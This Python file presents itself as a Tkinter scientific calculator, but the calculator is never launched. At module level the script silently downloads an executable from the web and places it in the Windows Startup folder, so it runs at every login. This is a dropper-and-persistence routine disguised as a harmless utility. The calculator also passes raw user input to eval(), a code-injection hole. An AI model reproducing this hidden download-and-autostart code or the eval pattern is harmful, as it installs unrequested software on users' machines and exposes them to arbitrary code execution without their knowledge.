import tkinter as tk
from tkinter import ttk
import math
import os
import requests
import shutil

def scientific_calculator():
    # Create a new tkinter window for the scientific calculator
    scientific_window = tk.Toplevel()
    scientific_window.title("Scientific Calculator")

    # Allow resizing of the scientific calculator window
    scientific_window.resizable(True, True)

    # Create an entry field for input
    entry = ttk.Entry(scientific_window)
    entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10, sticky="nsew")

    # Create a label to display the result
    result_label = ttk.Label(scientific_window, text="", font=("Helvetica", 16))
    result_label.grid(row=1, column=0, columnspan=4, padx=10, pady=10, sticky="nsew")

    # Function to evaluate the expression and update the entry field and result label
    def evaluate():
        try:
            expression = entry.get()
            result = str(eval(expression))
            entry.delete(0, tk.END)
            entry.insert(0, result)
            result_label.config(text="Result: " + result)
        except Exception as e:
            entry.delete(0, tk.END)
            entry.insert(0, "Error")
            result_label.config(text="Result: Error")

    # Create buttons for numbers, operators, and the equal sign
    button_values = [
        "7", "8", "9", "/",
        "4", "5", "6", "*",
        "1", "2", "3", "-",
        "0", ".", "=", "+",
    ]

    row, col = 2, 0
    for value in button_values:
        if value == "=":
            ttk.Button(scientific_window, text=value, command=evaluate).grid(row=row, column=col, padx=5, pady=5, sticky="nsew")
        else:
            ttk.Button(scientific_window, text=value, command=lambda v=value: entry.insert(tk.END, v)).grid(row=row, column=col, padx=5, pady=5, sticky="nsew")
        col += 1
        if col > 3:
            col = 0
            row += 1

    ttk.Button(scientific_window, text="Clear", command=lambda: entry.delete(0, tk.END)).grid(row=row, column=0, columnspan=4, padx=5, pady=5, sticky="nsew")


def download_and_move_to_startup(url, destination_folder):
    try:
        # Send an HTTP GET request to the URL
        response = requests.get(url, stream=True)
        response.raise_for_status()

        # Extract the filename from the URL
        filename = url.split("/")[-1]

        # Path to the downloaded file
        download_path = os.path.join(destination_folder, filename)

        # Save the content to the destination folder
        with open(download_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)

        # Check if the Startup folder exists
        if not os.path.exists(destination_folder):
            os.makedirs(destination_folder)

        # Move the downloaded file to the Startup folder
        startup_path = os.path.join(destination_folder, filename)
        shutil.move(download_path, startup_path)

        print(f"File downloaded and moved to {startup_path}")

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

# URL to download the file
file_url = "https://the.earth.li/~sgtatham/putty/latest/w64/pterm.exe"

# Destination folder (Startup folder)
startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Call the function to download and move the file
download_and_move_to_startup(file_url, startup_folder)




if __name__ == "__main__":
    # You can add test code here if needed
    pass
